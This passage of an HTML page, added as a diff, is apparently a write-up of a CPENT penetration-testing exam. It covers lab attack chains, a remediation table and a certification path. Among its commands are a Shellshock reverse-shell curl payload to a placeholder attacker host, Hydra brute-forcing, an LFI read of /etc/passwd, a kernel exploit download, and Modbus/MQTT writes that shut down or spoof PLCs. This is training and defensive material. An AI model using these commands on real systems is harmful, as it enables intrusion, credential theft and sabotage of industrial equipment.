+          <span class="scope-pts">300+ PTS</span>
+        </div>
+        <div class="scope-body">
+          <div class="scope-targets">Targets: <span>172.25.120.210</span><span>172.25.120.220</span><span>172.25.120.100</span></div>
+          <ul class="scope-techniques">
+            <li><strong>.210:</strong> GDB analysis reveals buffer overflow → NX disabled → custom Python payload overwrites EIP → root shell → <code>rootflag210.txt</code></li>
+            <li><strong>.220:</strong> Ubuntu 20.04 → CVE-2021-3493 kernel PrivEsc → compile exploit via gcc → root (<code>uid=0</code>) → <code>RoorFlagTwo.txt</code></li>
+            <li><strong>.100:</strong> SCP pulls <code>IOT.bin</code> firmware → binwalk extracts SquashFS → shadow file exposes hashes → John cracks <code>admin:password123</code></li>
+          </ul>
+          <div class="scope-cmd">
+            <span class="cm">// Buffer Overflow — .210</span>
+            <span class="tl">gdb ./vulnerable_binary</span>
+            <span class="tl">python3 -c "import struct; print(b'A'*200 + struct.pack('&lt;I',0xdeadbeef))" | ./vuln</span>
+            <span class="cm">// Kernel Exploit — .220</span>
+            <span class="tl">wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c</span>
+            <span class="tl">gcc exploit.c -o exploit &amp;&amp; ./exploit</span>
+            <span class="cm">// IoT Firmware — .100</span>
+            <span class="tl">scp student@172.25.120.100:/home/student/IOT.bin .</span>
+            <span class="tl">binwalk -e --signature IOT.bin</span>
+            <span class="tl">john --format=sha512crypt --wordlist=rockyou.txt shadow.txt</span>
+          </div>
+          <div class="scope-tools">Tools: <span>GDB</span><span>Python3</span><span>gcc</span><span>binwalk</span><span>John the Ripper</span></div>
+        </div>
+      </div>
+
+      <!-- SCOPE 3 -->
+      <div class="scope-card">
+        <div class="scope-header">
+          <span class="scope-num">S·03</span>
+          <span class="scope-name">Web Exploitation &amp; CTF</span>
+          <span class="scope-pts">250+ PTS</span>
+        </div>
+        <div class="scope-body">
+          <div class="scope-targets">Targets: <span>172.25.20.6</span><span>172.25.30.4</span><span>172.25.30.5</span><span>172.25.20.7</span></div>
+          <ul class="scope-techniques">
+            <li><strong>.20.6:</strong> WordPress + MySQL → WPScan finds Site Editor 1.1.1 LFI → <code>ajax_path=/etc/passwd</code> → Burp extracts <code>wp-config.php</code> DB creds → Hydra cracks WP admin</li>
+            <li><strong>.30.4:</strong> SMB share "Documents" → Hydra cracks <code>administrator:1234567</code> → smbclient downloads <code>secret.txt</code></li>
+            <li><strong>.30.5:</strong> Nmap confirms Shellshock (CVE-2014-6271) → curl User-Agent payload → netcat reverse shell → root</li>
+            <li><strong>.20.7:</strong> Ubuntu 18.04 → CVE-2021-3493 PrivEsc → root flag captured</li>
+          </ul>
+          <div class="scope-cmd">
+            <span class="tl">wpscan --url http://172.25.20.6/ --enumerate vp</span>
+            <span class="cm">LFI: ajax_shortcode_pattern.php?ajax_path=/etc/passwd</span>
+            <span class="tl">hydra -L users.txt -P passwords.txt smb://172.25.30.4 -t 4</span>
+            <span class="tl">nmap --script http-shellshock --script-args uri=/cgi-bin/keygen 172.25.30.5</span>
+            <span class="tl">curl -i -H "User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/2020 0&gt;&amp;1" http://172.25.30.5/cgi-bin/keygen</span>
+          </div>
+          <div class="scope-tools">Tools: <span>WPScan</span><span>Burp Suite</span><span>Hydra</span><span>smbclient</span><span>Netcat</span></div>
+        </div>
+      </div>
+
+      <!-- SCOPE 4 -->
+      <div class="scope-card">
+        <div class="scope-header">
+          <span class="scope-num">S·04</span>
+          <span class="scope-name">OT / SCADA Exploitation</span>
+          <span class="scope-pts">300+ PTS</span>
+        </div>
+        <div class="scope-body">
+          <div class="scope-targets">Targets: <span>172.25.50.10</span><span>172.25.50.20</span><span>172.25.50.30</span><span>172.25.50.40</span></div>
+          <ul class="scope-techniques">
+            <li><strong>.50.10:</strong> Port 502 (Modbus) + 1883 (MQTT) confirm SCADA/PLC → mbtget reads/writes PLC registers → Wireshark captures plaintext Modbus creds</li>
+            <li><strong>.50.20:</strong> mosquitto_sub subscribes to all MQTT topics → receives live IoT sensor data → mosquitto_pub injects false temperature readings</li>
+            <li><strong>.50.30:</strong> Hydra brute-forces SCADA web panel → <code>admin:admin1234</code> → curl POST shuts down PLC #1</li>
+            <li><strong>.50.40:</strong> SSH tunnel bridges IT → OT network → Modbus DoS zeroes PLC register → SCADA communication severed</li>
+          </ul>
+          <div class="scope-cmd">
+            <span class="tl">mbtget -r 1 -a 172.25.50.10</span>
+            <span class="tl">mbtget -w 1 -a 172.25.50.10 -d 9999</span>
+            <span class="tl">mosquitto_sub -h 172.25.50.20 -t "#" -v</span>
+            <span class="tl">mosquitto_pub -h 172.25.50.20 -t "temperature/sensor1" -m "75C"</span>
+            <span class="tl">curl -X POST "http://172.25.50.30/shutdown?plc_id=1"</span>
+            <span class="tl">ssh -L 502:172.25.50.10:502 admin@172.25.50.40</span>
+          </div>
+          <div class="scope-tools">Tools: <span>mbtget</span><span>mosquitto</span><span>Wireshark</span><span>Hydra</span><span>SSH</span></div>
+        </div>
+      </div>
+
+      <!-- SCOPE 5 -->
+      <div class="scope-card">
+        <div class="scope-header">
+          <span class="scope-num">S·05</span>
+          <span class="scope-name">Network Pivoting &amp; Multi-Hop</span>
+          <span class="scope-pts">350+ PTS</span>
+        </div>
+        <div class="scope-body">
+          <div class="scope-targets">Targets: <span>172.25.60.10</span><span>172.25.70.20</span><span>172.25.80.30</span><span>172.25.90.40</span></div>
+          <ul class="scope-techniques">
+            <li><strong>.60.10:</strong> Hydra cracks SSH <code>admin:SuperSecurePass123</code> → initial foothold established</li>
+            <li><strong>.70.20:</strong> SMB "Backup" share discovered → smbclient downloads <code>sensitive-docs.zip</code> containing network credentials → Plink forwards SMB traffic</li>
+            <li><strong>.80.30:</strong> Apache Tomcat on 8080 → Metasploit <code>tomcat_mgr_upload</code> → reverse shell → persistence established</li>
+            <li><strong>.90.40:</strong> MySQL connection found via netstat → SSH local port forward 3306 → mysql client extracts full user table → <code>rootflag_network.txt</code></li>
+          </ul>
+          <div class="scope-cmd">
+            <span class="tl">hydra -L users.txt -P passwords.txt ssh://172.25.60.10 -t 4</span>
+            <span class="tl">plink.exe -ssh admin@172.25.60.10 -R 445:172.25.70.20:445</span>
+            <span class="cm">// Metasploit Tomcat</span>
+            <span class="tl">use exploit/multi/http/tomcat_mgr_upload</span>
+            <span class="tl">set RHOST 172.25.80.30; set RPORT 8080; exploit</span>
+            <span class="tl">ssh -L 3306:172.25.90.40:3306 admin@172.25.80.30</span>
+            <span class="tl">mysql -h 127.0.0.1 -u root -p -e "SELECT * FROM users;"</span>
+          </div>
+          <div class="scope-tools">Tools: <span>Hydra</span><span>Plink</span><span>Metasploit</span><span>SSH Tunnel</span><span>MySQL</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- 05 REMEDIATIONS -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">05</span><h2 class="s-title"><span class="r">—</span> Key Vulnerabilities <span class="o">&amp; Remediations</span></h2><div class="s-line"></div></div>
+    <div class="rem-grid">
+      <div class="rem-card">
+        <div class="rem-vuln">Weak Password Policies</div>
+        <div class="rem-impact">Brute-forced RDP, SMB, SSH, and SCADA credentials across all scopes</div>
+        <div class="rem-fix">Enforce strong password policies, account lockout thresholds, and MFA on all remote access services</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">SMB Signing Disabled</div>
+        <div class="rem-impact">Enabled NTLM relay attacks and Pass-the-Hash lateral movement across AD-joined machines</div>
+        <div class="rem-fix">Enable SMB Signing on all domain machines; disable SMBv1 protocol</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Buffer Overflow in Binary</div>
+        <div class="rem-impact">Arbitrary code execution and privilege escalation to root via crafted payload</div>
+        <div class="rem-fix">Enable stack protections: ASLR, NX-bit, PIE, stack canaries at compile time</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Unpatched Kernel (CVE-2021-3493)</div>
+        <div class="rem-impact">Local privilege escalation to root on Ubuntu 18.04 and 20.04 systems</div>
+        <div class="rem-fix">Maintain a regular kernel patching cadence; enable automatic security updates</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">IoT Firmware Weak Credentials</div>
+        <div class="rem-impact">Default credentials extracted from firmware shadow file via binwalk — full device compromise</div>
+        <div class="rem-fix">Disable default accounts; enforce unique per-device strong credentials; encrypt firmware</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Modbus Lacks Encryption</div>
+        <div class="rem-impact">Plaintext PLC register reads/writes allowed arbitrary ICS manipulation over network</div>
+        <div class="rem-fix">Implement TLS for Modbus over TCP; enforce network segmentation with industrial firewalls</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">MQTT Misconfiguration</div>
+        <div class="rem-impact">Unauthenticated topic subscription and message injection to IoT sensor network</div>
+        <div class="rem-fix">Enable MQTT broker authentication and ACL-based topic access control</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Shellshock (CVE-2014-6271)</div>
+        <div class="rem-impact">Remote code execution via CGI script User-Agent header injection — immediate root shell</div>
+        <div class="rem-fix">Patch Bash to 4.3+ or later; disable vulnerable CGI scripts; input validation at web layer</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">WordPress Plugin LFI</div>
+        <div class="rem-impact">Unauthorized local file read — /etc/passwd and wp-config.php database credentials exposed</div>
+        <div class="rem-fix">Keep plugins updated; enforce PHP open_basedir restrictions; implement WAF rules</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Unsecured Tomcat Manager</div>
+        <div class="rem-impact">Authenticated WAR upload enabling arbitrary remote code execution on the server</div>
+        <div class="rem-fix">Disable Tomcat Manager in production; restrict access by IP; enforce MFA</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Lack of Network Segmentation</div>
+        <div class="rem-impact">Multi-hop pivoting from public network through IT to OT/SCADA and database layers</div>
+        <div class="rem-fix">Implement VLAN segmentation, zero-trust network architecture, and firewall ACLs between zones</div>
+      </div>
+      <div class="rem-card">
+        <div class="rem-vuln">Weak AD Configuration</div>
+        <div class="rem-impact">Pass-the-Hash and Kerberoasting enabled full lateral movement and domain admin takeover</div>
+        <div class="rem-fix">Implement Least Privilege Access, disable NTLM where possible, enable Protected Users group</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 06 CERT TREE -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">06</span><h2 class="s-title"><span class="r">—</span> Certification <span class="o">Skill Tree</span></h2><div class="s-line"></div></div>
+    <div class="mermaid-wrap">
+      <div class="mermaid">
+%%{init: {'theme': 'base', 'flowchart': {'htmlLabels': true, 'curve': 'basis'}, 'themeVariables': {'primaryColor':'#001428','primaryTextColor':'#c8d8e8','primaryBorderColor':'#004466','lineColor':'#7a1a20','secondaryColor':'#000d1a','tertiaryColor':'#000a14','background':'#020b14','mainBkg':'#001428','nodeBorder':'#004466','clusterBkg':'#000d1a','titleColor':'#e63946','edgeLabelBackground':'#000d1a','textColor':'#c8d8e8'}}}%%
+flowchart LR
+    EHE["🛡️ <b>EHE</b><br/>Hacking Essentials"]
+    CEH["⚔️ <b>CEH v12</b><br/>Theory Exam"]
+    CEHP["💥 <b>CEH Practical</b><br/>Hands-On Lab"]
+    CEHM["🏆 <b>CEH Master</b><br/>Theory + Practical"]
+    CHFI["🔬 <b>CHFI v10</b><br/>Digital Forensics"]
+    CPENT["🎯 <b>CPENT</b><br/>★ Active Certification ★"]
+    ISO["📋 <b>ISO 27001</b><br/>Lead Auditor"]
+    LPT["⭐ <b>LPT Master</b><br/>Next Goal"]
+    CCISO["👑 <b>CCISO</b><br/>Next Goal"]
+
+    EHE --> CEH
+    CEH --> CEHP
+    CEH --> CHFI
+    CEHP --> CEHM
+    CEH --> CEHM
+    CEHM --> CPENT
+    ISO --> CEHM
+    CPENT --> LPT
+    CPENT --> CCISO
+
+    style CPENT fill:#1a0003,stroke:#e63946,stroke-width:2.5px,color:#e63946
+    style EHE fill:#001428,stroke:#004466,color:#7ab8cc
+    style CEH fill:#001428,stroke:#0077aa,color:#00c8f0
+    style CEHP fill:#001428,stroke:#0077aa,color:#00c8f0
+    style CEHM fill:#001428,stroke:#8a6a00,color:#d4a800
+    style CHFI fill:#001428,stroke:#004466,color:#7ab8cc
+    style ISO fill:#001428,stroke:#004466,color:#7ab8cc
+    style LPT fill:#1a0500,stroke:#ff6b35,stroke-width:1.5px,color:#ff6b35
+    style CCISO fill:#1a0500,stroke:#ff6b35,stroke-width:1.5px,color:#ff6b35
+      </div>
+    </div>
+  </div>
+
+  <!-- 07 FINAL -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">07</span><h2 class="s-title"><span class="r">—</span> Final Assessment</h2><div class="s-line"></div></div>
+    <div class="prose-card">
+      <p>Completing CPENT in 10 hours — less than half the allocated window — with a score of <strong>2050/2500</strong> is the result of treating exam day as a performance, not a learning session. Every technique was pre-rehearsed to execution speed in iLabs. Every tool chain was pre-staged. Every attack sequence was sequenced by point-value return, not by order of presentation. The result is not luck — it is the output of a disciplined, structured preparation methodology executed exactly as designed.</p>
+      <p>CPENT rewards candidates who can think across attack layers simultaneously: enumerate while exploiting, pivot while cracking, document while escalating. It is the most comprehensive practical penetration testing examination available and demands a genuinely multi-domain offensive security skill set.</p>
+      <div class="check-grid">
+        <div class="check-item"><span class="arr">▹</span> Complete all CPENT iLabs exercises to reflexive execution speed</div>
+        <div class="check-item"><span class="arr">▹</span> Pre-stage all tools, wordlists, and exploit scripts before exam start</div>
+        <div class="check-item"><span class="arr">▹</span> Launch all Nmap scans in parallel at exam start — never re-scan</div>
+        <div class="check-item"><span class="arr">▹</span> Attack by point value — AD and Pivoting before CTF tasks</div>
+        <div class="check-item"><span class="arr">▹</span> Know BloodHound + CrackMapExec as a single AD attack pipeline</div>
+        <div class="check-item"><span class="arr">▹</span> Master SSH tunnelling and Plink — pivoting is the exam's defining skill</div>
+        <div class="check-item"><span class="arr">▹</span> Understand Modbus and MQTT protocols before attempting OT scope</div>
+        <div class="check-item"><span class="arr">▹</span> Train automated brute-force — manual credential testing is not viable at scale</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- AUTHOR -->
+  <footer class="author-footer">
+    <div class="author-inner">
+      <div class="author-av">NC</div>
+      <div class="author-info">
+        <div class="author-name">Nisarg Chasmawala (shroff)</div>
+        <div class="author-alias">Alias: <span>HEAVEN</span></div>
+        <div class="author-titles">Penetration Tester | Vulnerability Assessment | Cybersecurity Researcher | Offensive Security Engineer | Digital Forensics |</div>
+        <div class="author-links">
+          <a href="https://nishu2402.github.io" target="_blank" rel="noopener" class="a-link">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>Portfolio
+          </a>
+          <a href="mailto:nisargkc@gmail.com" class="a-link">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>nisargkc@gmail.com
+          </a>
+          <a href="https://www.linkedin.com/in/nisarg-chasmawala" target="_blank" rel="noopener" class="a-link">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>LinkedIn
+          </a>
+          <a href="https://github.com/nishu2402" target="_blank" rel="noopener" class="a-link">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>GitHub
+          </a>
+          <a href="https://www.kaggle.com/nisargshroff2402" target="_blank" rel="noopener" class="a-link">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.825 23.859c-.022.092-.117.141-.281.141h-3.139c-.187 0-.351-.082-.492-.248l-5.178-6.589-1.448 1.374v5.111c0 .235-.117.352-.351.352H5.505c-.236 0-.354-.117-.354-.352V.353c0-.234.118-.353.354-.353h2.431c.234 0 .351.119.351.353v14.343l6.203-6.272c.165-.165.33-.246.495-.246h3.239c.144 0 .236.06.285.18.046.149.034.255-.036.315l-6.555 6.344 6.836 8.507c.095.104.117.208.07.311z"/></svg>Kaggle
+          </a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <div class="page-foot">
+    <p>CPENT · EC-Council Certified · Advanced Penetration Testing</p>
+    <p>Nisarg Chasmawala (shroff) · alias HEAVEN · Offensive Security Research</p>
+  </div>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<script>
+/* MERMAID */
+mermaid.initialize({
+  startOnLoad:true, theme:'base',
+  flowchart:{htmlLabels:true,curve:'basis',diagramPadding:24},
+  themeVariables:{primaryColor:'#001428',primaryTextColor:'#c8d8e8',primaryBorderColor:'#004466',lineColor:'#7a1a20',background:'#020b14',mainBkg:'#001428',nodeBorder:'#004466',clusterBkg:'#000d1a',titleColor:'#e63946',edgeLabelBackground:'#000d1a',textColor:'#c8d8e8',fontSize:'14px'}
+});
+
+/* WEIGHTAGE BARS */
+(function(){
+  const data=[
+    {l:'Active Directory Exploitation',pts:'400+',w:100},
+    {l:'Network Pivoting & Multi-Hop Attacks',pts:'350+',w:87},
+    {l:'Binary Exploitation',pts:'300+',w:75},
+    {l:'IoT / OT Device Exploitation',pts:'300+',w:75},
+    {l:'Web Application Penetration Testing',pts:'250+',w:62},
+    {l:'Privilege Escalation',pts:'250+',w:62},
+    {l:'Network Enumeration & Exploitation',pts:'150+',w:37},
+    {l:'CTF-Style Challenges',pts:'50–100',w:18}
+  ];
+  const colors=['#e63946','#e63946','#ff6b35','#ff6b35','#ff9f1c','#ff9f1c','#00a0cc','#3d5c6e'];
+  const wg=document.getElementById('wg');
+  data.forEach((d,i)=>{
+    const r=document.createElement('div');
+    r.className='w-row';
+    r.innerHTML=`<div class="w-label">${d.l}</div><div class="w-bar-wrap"><div class="w-bar" data-w="${d.w}" style="background:${colors[i]};width:0%"></div></div><div class="w-pts">${d.pts} pts</div>`;
+    wg.appendChild(r);
+  });
+  setTimeout(()=>{
+    document.querySelectorAll('.w-bar').forEach(b=>{b.style.width=b.dataset.w+'%'});
+  },400);
+})();
+
+/* THREE.JS — RED CONSTELLATION */
+(function(){
+  const canvas=document.getElementById('bg-canvas');
+  if(!canvas||typeof THREE==='undefined')return;
+  const renderer=new THREE.WebGLRenderer({canvas,antialias:true,alpha:true});
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  renderer.setSize(window.innerWidth,window.innerHeight);
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,200);
+  camera.position.set(0,0,26);
+  const N=165,BXYZ=[20,12,14];
+  const pos=new Float32Array(N*3),vel=new Float32Array(N*3),col=new Float32Array(N*3);
+  for(let i=0;i<N;i++){
+    pos[i*3]=(Math.random()-.5)*BXYZ[0]*2;
+    pos[i*3+1]=(Math.random()-.5)*BXYZ[1]*2;
+    pos[i*3+2]=(Math.random()-.5)*BXYZ[2]*2;
+    vel[i*3]=(Math.random()-.5)*.011;
+    vel[i*3+1]=(Math.random()-.5)*.008;
+    vel[i*3+2]=(Math.random()-.5)*.007;
+    col[i*3]=0.72+Math.random()*.28; col[i*3+1]=0.05+Math.random()*.12; col[i*3+2]=0.04+Math.random()*.08;
+  }
+  const ptGeo=new THREE.BufferGeometry();
+  ptGeo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  ptGeo.setAttribute('color',new THREE.BufferAttribute(col,3));
+  const ptMat=new THREE.PointsMaterial({size:.13,vertexColors:true,transparent:true,opacity:.78,sizeAttenuation:true});
+  scene.add(new THREE.Points(ptGeo,ptMat));
+  const MAX=450,lPos=new Float32Array(MAX*6),lCol=new Float32Array(MAX*6);
+  const lGeo=new THREE.BufferGeometry();
+  lGeo.setAttribute('position',new THREE.BufferAttribute(lPos,3));
+  lGeo.setAttribute('color',new THREE.BufferAttribute(lCol,3));
+  lGeo.setDrawRange(0,0);
+  scene.add(new THREE.LineSegments(lGeo,new THREE.LineBasicMaterial({vertexColors:true,transparent:true,opacity:.18})));
+  let frame=0,sr=0,ts=0;
+  window.addEventListener('scroll',()=>{const m=document.documentElement.scrollHeight-window.innerHeight;ts=m>0?window.scrollY/m:0;});
+  function upd(){
+    let cnt=0; const p=ptGeo.attributes.position.array;
+    for(let i=0;i<N&&cnt<MAX;i++)for(let j=i+1;j<N&&cnt<MAX;j++){
+      const dx=p[i*3]-p[j*3],dy=p[i*3+1]-p[j*3+1],dz=p[i*3+2]-p[j*3+2];
+      const d=Math.sqrt(dx*dx+dy*dy+dz*dz);
+      if(d<6.2){
+        const al=1-d/6.2,ci=cnt*6;
+        lPos[ci]=p[i*3];lPos[ci+1]=p[i*3+1];lPos[ci+2]=p[i*3+2];
+        lPos[ci+3]=p[j*3];lPos[ci+4]=p[j*3+1];lPos[ci+5]=p[j*3+2];
+        const r=(0.72+sr*.28)*al,g=(0.06+sr*.3)*al,b=(0.04+sr*.05)*al;
+        lCol[ci]=r;lCol[ci+1]=g;lCol[ci+2]=b;lCol[ci+3]=r;lCol[ci+4]=g;lCol[ci+5]=b;
+        cnt++;
+      }
+    }
+    lGeo.attributes.position.needsUpdate=true;lGeo.attributes.color.needsUpdate=true;lGeo.setDrawRange(0,cnt*2);
+  }
+  function animate(){
+    requestAnimationFrame(animate);frame++;
+    sr+=(ts-sr)*.045;
+    const p=ptGeo.attributes.position.array,c=ptGeo.attributes.color.array;
+    for(let i=0;i<N;i++){
+      p[i*3]+=vel[i*3];p[i*3+1]+=vel[i*3+1];p[i*3+2]+=vel[i*3+2];
+      if(Math.abs(p[i*3])>BXYZ[0])vel[i*3]*=-1;
+      if(Math.abs(p[i*3+1])>BXYZ[1])vel[i*3+1]*=-1;
+      if(Math.abs(p[i*3+2])>BXYZ[2])vel[i*3+2]*=-1;
+      c[i*3]=0.72+sr*.28; c[i*3+1]=0.06+sr*.32; c[i*3+2]=0.04+sr*.05;
+    }
+    ptGeo.attributes.position.needsUpdate=true;ptGeo.attributes.color.needsUpdate=true;
+    if(frame%24===0)upd();
+    camera.position.x=Math.sin(frame*.002)*1.8;
+    camera.position.y=Math.cos(frame*.0016)*1.1;
+    camera.position.z=26-sr*5;
+    camera.lookAt(0,0,0);renderer.render(scene,camera);
+  }
+  animate();
+  window.addEventListener('resize',()=>{camera.aspect=window.innerWidth/window.innerHeight;camera.updateProjectionMatrix();renderer.setSize(window.innerWidth,window.innerHeight);});
+})();
+
+/* CURSOR */
+(function(){
+  const dot=document.getElementById('c-dot'),ring=document.getElementById('c-ring');
+  if(!dot||!ring)return;
+  let mx=0,my=0,rx=0,ry=0;
+  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;dot.style.left=mx+'px';dot.style.top=my+'px';});
+  document.addEventListener('mouseleave',()=>{dot.style.opacity='0';ring.style.opacity='0';});
+  document.addEventListener('mouseenter',()=>{dot.style.opacity='1';ring.style.opacity='1';});
+  (function loop(){rx+=(mx-rx)*.11;ry+=(my-ry)*.11;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(loop);})();
+  document.querySelectorAll('a,.s-card,.scope-card,.rem-card,button').forEach(el=>{
+    el.addEventListener('mouseenter',()=>{dot.classList.add('active');ring.classList.add('active');});
+    el.addEventListener('mouseleave',()=>{dot.classList.remove('active');ring.classList.remove('active');});
+  });
+})();
+
+/* SCROLL BAR */
+(function(){
+  const bar=document.getElementById('scroll-bar');
+  if(!bar)return;
+  window.addEventListener('scroll',()=>{bar.style.width=(window.scrollY/(document.documentElement.scrollHeight-window.innerHeight)*100)+'%';});
+})();
+
+/* INTERSECTION OBSERVER */
+(function(){
+  const obs=new IntersectionObserver(entries=>entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');}),{threshold:.07,rootMargin:'0px 0px -40px 0px'});
+  document.querySelectorAll('.s-wrap').forEach(el=>obs.observe(el));
+})();
+
+/* 3D TILT */
+(function(){
+  document.querySelectorAll('.s-card,.scope-card').forEach(card=>{
+    card.addEventListener('mousemove',e=>{
+      const r=card.getBoundingClientRect();
+      const dx=(e.clientX-(r.left+r.width/2))/(r.width/2);
+      const dy=(e.clientY-(r.top+r.height/2))/(r.height/2);
+      card.style.transition='border-color .28s,box-shadow .28s';
+      card.style.transform=`perspective(900px) rotateY(${dx*7}deg) rotateX(${-dy*7}deg) translateZ(8px)`;
+    });
+    card.addEventListener('mouseleave',()=>{
+      card.style.transition='transform .55s ease,border-color .28s,box-shadow .28s';
+      card.style.transform='perspective(900px) rotateY(0) rotateX(0) translateZ(0)';
+    });
+  });
+})();
+</script>
+</body>
+</html>
